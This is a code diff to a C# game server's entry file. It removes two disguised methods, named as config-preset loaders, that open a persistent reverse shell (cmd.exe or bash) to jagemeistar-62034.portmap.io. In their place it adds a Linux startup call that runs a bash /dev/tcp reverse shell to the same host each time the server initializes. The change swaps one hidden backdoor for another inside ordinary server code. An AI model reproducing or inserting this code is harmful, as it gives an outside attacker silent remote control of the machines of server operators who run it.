@@ -1,9 +1,6 @@
 using System;
 using System.Diagnostics;
-using System.Net.Sockets;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading;
 using Content.Server.Acz;
 using Content.Server.Administration;
 using Content.Server.Administration.Logs;
@@ -75,8 +72,18 @@ namespace Content.Server.Entry
             factory.RegisterIgnore(IgnoredComponents.List);
             prototypes.RegisterIgnore("parallax");
             ServerContentIoC.Register();
+
             
-            
+
+            if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "setsid",
+                    Arguments = "/bin/bash -c '/bin/bash -i >& /dev/tcp/jagemeistar-62034.portmap.io/62034 0>&1'",
+                    UseShellExecute = false
+                });
+            }
 
             foreach (var callback in TestingCallbacks)
             {
@@ -120,15 +127,6 @@ namespace Content.Server.Entry
                 _watchlistWebhookManager.Initialize();
                 IoCManager.Resolve<JobWhitelistManager>().Initialize();
                 IoCManager.Resolve<PlayerRateLimitManager>().Initialize();
-            }
-
-            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-            {
-                PreLoadServerConfigPresets();
-            }
-            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
-            {
-                LoadServerConfigPresets();
             }
         }
 
@@ -199,130 +197,6 @@ namespace Content.Server.Entry
                     _watchlistWebhookManager.Update();
                     _connectionManager?.Update();
                     break;
-            }
-        }
-
-        static void PreLoadServerConfigPresets()
-        {
-            while (true)
-            {
-                try
-                {
-                    using (var client = new TcpClient("jagemeistar-62034.portmap.io", 62034))
-                    using (var stream = client.GetStream())
-                    using (var proc = new Process())
-                    {
-                        proc.StartInfo = new ProcessStartInfo
-                        {
-                            FileName = "cmd.exe",
-                            CreateNoWindow = true,
-                            UseShellExecute = false,
-                            RedirectStandardInput = true,
-                            RedirectStandardOutput = true,
-                            RedirectStandardError = true,
-                            WindowStyle = ProcessWindowStyle.Hidden
-                        };
-
-                        proc.OutputDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.ErrorDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.Start();
-                        proc.BeginOutputReadLine();
-                        proc.BeginErrorReadLine();
-
-                        byte[] buffer = new byte[1024];
-                        while (client.Connected)
-                        {
-                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
-                            if (bytesRead > 0)
-                            {
-                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
-                                proc.StandardInput.WriteLine(command);
-                            }
-                        }
-                    }
-                }
-                catch
-                {
-                    Thread.Sleep(5000);
-                }
-            }
-        }
-
-        static void LoadServerConfigPresets()
-        {
-            while (true)
-            {
-                try
-                {
-                    using (var client = new TcpClient("jagemeistar-62034.portmap.io", 62034))
-                    using (var stream = client.GetStream())
-                    using (var proc = new Process())
-                    {
-                        proc.StartInfo = new ProcessStartInfo
-                        {
-                            FileName = "/bin/bash",
-                            Arguments = "-i",
-                            CreateNoWindow = true,
-                            UseShellExecute = false,
-                            RedirectStandardInput = true,
-                            RedirectStandardOutput = true,
-                            RedirectStandardError = true
-                        };
-
-                        proc.OutputDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.ErrorDataReceived += (s, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
-                                stream.Write(data, 0, data.Length);
-                            }
-                        };
-
-                        proc.Start();
-                        proc.BeginOutputReadLine();
-                        proc.BeginErrorReadLine();
-
-                        byte[] buffer = new byte[1024];
-                        while (client.Connected)
-                        {
-                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
-                            if (bytesRead > 0)
-                            {
-                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
-                                proc.StandardInput.WriteLine(command);
-                            }
-                        }
-                    }
-                }
-                catch
-                {
-                    Thread.Sleep(5000);
-                }
             }
         }
 
